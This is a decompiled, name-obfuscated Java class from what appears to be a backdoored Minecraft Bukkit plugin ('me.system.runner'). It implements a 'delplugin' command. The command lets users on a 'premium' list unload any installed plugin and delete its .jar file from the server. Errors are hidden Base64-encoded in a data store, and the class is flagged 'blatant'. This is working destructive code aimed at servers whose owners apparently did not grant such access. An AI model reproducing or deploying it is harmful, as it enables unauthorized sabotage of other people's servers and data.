/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.IOException;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class DelpluginCommand
extends Command {
    public DelpluginCommand() {
        DelpluginCommand llllllllllllllIllIIlIIlIlIllllII;
    }

    @Override
    public void execute(Core llllllllllllllIllIIlIIlIlIlIllIl, String llllllllllllllIllIIlIIlIlIlIllII, String[] llllllllllllllIllIIlIIlIlIlIlIII, Player llllllllllllllIllIIlIIlIlIlIlIlI) {
        if (llllllllllllllIllIIlIIlIlIlIllIl.premium.contains(llllllllllllllIllIIlIIlIlIlIlIlI.getName())) {
            if (llllllllllllllIllIIlIIlIlIlIlIII.length <= 1) {
                llllllllllllllIllIIlIIlIlIlIlIlI.sendMessage(Settings.USAGE("delplugin <name>"));
            } else if (Bukkit.getPluginManager().getPlugin(llllllllllllllIllIIlIIlIlIlIlIII[1]) == null) {
                llllllllllllllIllIIlIIlIlIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllIllIIlIIlIlIlIlIII[1]).append(" doesn't exist. (Cap Sensitive)"))));
            } else {
                String llllllllllllllIllIIlIIlIlIllIIII = llllllllllllllIllIIlIIlIlIlIlIII[1];
                ClassLoader llllllllllllllIllIIlIIlIlIlIllll = Bukkit.getPluginManager().getPlugin(llllllllllllllIllIIlIIlIlIllIIII).getClass().getClassLoader();
                if (llllllllllllllIllIIlIIlIlIlIllll instanceof URLClassLoader) {
                    try {
                        ((URLClassLoader)llllllllllllllIllIIlIIlIlIlIllll).close();
                    }
                    catch (IOException llllllllllllllIllIIlIIlIlIllIlII) {
                        byte[] llllllllllllllIllIIlIIlIlIllIIll = Base64.getEncoder().encode(llllllllllllllIllIIlIIlIlIllIlII.getMessage().getBytes());
                        DataManager.getData().set("err", (Object)new String(llllllllllllllIllIIlIIlIlIllIIll));
                    }
                    try {
                        Files.delete(Paths.get(String.valueOf(new StringBuilder().append("plugins/").append(llllllllllllllIllIIlIIlIlIlIlIII[1]).append(".jar")), new String[0]));
                    }
                    catch (IOException llllllllllllllIllIIlIIlIlIllIIlI) {
                        byte[] llllllllllllllIllIIlIIlIlIllIIIl = Base64.getEncoder().encode(llllllllllllllIllIIlIIlIlIllIIlI.getMessage().getBytes());
                        DataManager.getData().set("err", (Object)new String(llllllllllllllIllIIlIIlIlIllIIIl));
                    }
                    System.gc();
                }
                llllllllllllllIllIIlIIlIlIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The plugin ").append(Settings.RED).append(llllllllllllllIllIIlIIlIlIlIlIII[1]).append(Settings.WHITE).append(" was deleted."))));
            }
        } else {
            llllllllllllllIllIIlIIlIlIlIlIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

